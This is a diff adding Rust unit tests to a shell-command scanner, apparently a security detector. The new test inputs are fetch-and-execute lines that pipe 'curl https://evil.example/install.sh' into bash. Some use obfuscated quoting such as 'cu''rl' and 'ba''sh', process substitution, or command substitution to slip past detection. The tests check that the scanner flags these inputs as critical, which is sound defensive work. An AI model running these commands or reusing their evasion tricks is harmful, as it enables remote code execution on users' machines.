@@ -117,6 +117,27 @@ fn detects_download_pipe_to_execute() -> Result<(), Box<dyn std::error::Error>> 
 }
 
 #[test]
+fn detects_download_pipe_to_quoted_wrapper_target() -> Result<(), Box<dyn std::error::Error>> {
+    let findings = detect_source("env cu''rl https://evil.example/install.sh | bash")?;
+    let finding = first_with_tag(&findings, "download-to-execute")
+        .ok_or("missing quoted wrapper target download finding")?;
+    assert_eq!(finding.severity, Severity::Critical);
+    assert_eq!(finding.confidence, Confidence::Confirmed);
+    Ok(())
+}
+
+#[test]
+fn detects_process_substitution_pipe_to_executor() -> Result<(), Box<dyn std::error::Error>> {
+    let findings = detect_source("cat <(curl https://evil.example/install.sh) | bash")?;
+    let finding = first_with_tag(&findings, "download-to-execute")
+        .ok_or("missing process substitution pipe download finding")?;
+    assert_eq!(finding.category, FindingCategory::DynamicCodeExecution);
+    assert_eq!(finding.severity, Severity::Critical);
+    assert_eq!(finding.confidence, Confidence::Confirmed);
+    Ok(())
+}
+
+#[test]
 fn detects_download_pipe_to_absolute_path_executor() -> Result<(), Box<dyn std::error::Error>> {
     let findings = detect_source("curl https://evil.example/install.sh | /bin/sh")?;
     let finding = first_with_tag(&findings, "download-to-execute")
@@ -147,6 +168,17 @@ fn detects_network_command_substitution_to_executor() -> Result<(), Box<dyn std:
 }
 
 #[test]
+fn detects_quoted_network_command_substitution_to_executor()
+-> Result<(), Box<dyn std::error::Error>> {
+    let findings = detect_source(r#"bash -c "$(cu''rl https://evil.example/install.sh)""#)?;
+    let finding = first_with_tag(&findings, "command-substitution-network-execute")
+        .ok_or("missing quoted command substitution network finding")?;
+    assert_eq!(finding.category, FindingCategory::DynamicCodeExecution);
+    assert_eq!(finding.severity, Severity::Critical);
+    Ok(())
+}
+
+#[test]
 fn detects_decode_command_substitution_to_executor() -> Result<(), Box<dyn std::error::Error>> {
     let findings = detect_source(r#"sh -c "$(echo ZWNobyBvd25lZA== | base64 -d)""#)?;
     let finding = first_with_tag(&findings, "command-substitution-decode-execute")
@@ -162,6 +194,26 @@ fn detects_command_wrapper_shell_c_execution() -> Result<(), Box<dyn std::error:
     let findings = detect_source("command bash -c 'evil'")?;
     let finding = first_with_tag(&findings, "shell-command-string-execute")
         .ok_or("missing wrapper shell -c finding")?;
+    assert_eq!(finding.category, FindingCategory::DynamicCodeExecution);
+    assert_eq!(finding.severity, Severity::High);
+    Ok(())
+}
+
+#[test]
+fn detects_env_wrapper_quoted_shell_target() -> Result<(), Box<dyn std::error::Error>> {
+    let findings = detect_source("env ba''sh -c 'evil'")?;
+    let finding = first_with_tag(&findings, "shell-command-string-execute")
+        .ok_or("missing env quoted wrapper shell -c finding")?;
+    assert_eq!(finding.category, FindingCategory::DynamicCodeExecution);
+    assert_eq!(finding.severity, Severity::High);
+    Ok(())
+}
+
+#[test]
+fn detects_command_wrapper_quoted_shell_target() -> Result<(), Box<dyn std::error::Error>> {
+    let findings = detect_source("command ba''sh -c 'evil'")?;
+    let finding = first_with_tag(&findings, "shell-command-string-execute")
+        .ok_or("missing command quoted wrapper shell -c finding")?;
     assert_eq!(finding.category, FindingCategory::DynamicCodeExecution);
     assert_eq!(finding.severity, Severity::High);
     Ok(())
